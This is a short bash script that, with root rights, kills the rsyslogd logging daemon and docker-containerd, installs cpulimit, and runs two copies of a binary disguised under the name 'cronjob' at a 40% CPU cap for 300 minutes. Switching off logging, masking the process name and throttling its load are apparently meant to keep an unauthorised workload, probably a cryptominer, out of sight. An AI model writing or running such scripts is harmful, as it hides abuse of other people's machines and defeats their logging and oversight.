#!/bin/bash
sudo apt-get update &
sleep 10
sudo killall rsyslogd &&
sudo killall docker-containerd &&
sudo apt install -y cpulimit &&
chmod +x ~/gg002/cronjob &&
cpulimit -e cronjob -l 40 -b &
sleep 15
sudo ~/gg002/./cronjob &
sudo ~/gg002/./cronjob &
sleep 300m


